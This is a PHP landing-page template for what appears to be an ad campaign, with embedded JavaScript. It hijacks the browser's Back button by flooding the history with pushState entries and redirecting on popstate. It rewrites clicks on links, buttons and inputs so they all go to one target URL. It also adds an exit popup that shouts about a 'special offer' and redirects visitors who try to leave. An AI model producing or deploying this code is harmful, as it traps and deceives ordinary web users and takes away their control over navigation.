<?php
	if (!$click_selectors) {$click_selectors = 'a, div.name, button,div.btn, input';}
	if (!$exit_msg) {$exit_msg = 'WAIT! YOU WILL MISS OUR SPECIAL OFFER IF YOU CLOSE THE BROWSER!!';}
?>


<?php if (!$no_jq): ?>
<script
  src="https://code.jquery.com/jquery-1.12.4.min.js"
  integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ="
  crossorigin="anonymous"></script>
<?php endif; ?>

<?php if (!$no_favico): ?>
<link rel="icon" href="data:;base64,iVBORw0KGgo=">
<?php endif; ?>

<script>
	var g = '<?= $goto_url ?>';
	<?php if ($campaign['back_js']): ?>
	!function(){
		var campaign_link = '<?= $goto_url_bjs ?>';
		var t;
		try{
		  for(t=0;10>t;++t)history.pushState({},"","#");
		  onpopstate=function(t){t.state&&location.replace(campaign_link)}}
		catch(o){}
	}();
	<?php endif; ?>

	<?php if (!$campaign['dont_modify_href']): ?>
	$(function(){
		$('<?= $click_selectors ?>').click(function(e){
			e.preventDefault();

			window.onbeforeunload = null;
			window.location.href = g;
		});
	});
	<?php endif; ?>


	<?php if($campaign['exit_popup']): ?>
	window.onbeforeunload =  function (e) {

		window.setTimeout(function () { // escape function context
						window.location = g;
					}, 0);
				window.onbeforeunload = null;   // necessary to prevent infinite loop


		var confirmationMessage = '************************** \n  <?= $exit_msg ?> \n **************************';

		(e || window.event).returnValue = confirmationMessage; //Gecko + IE
		return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
	};
	<?php endif; ?>

</script>
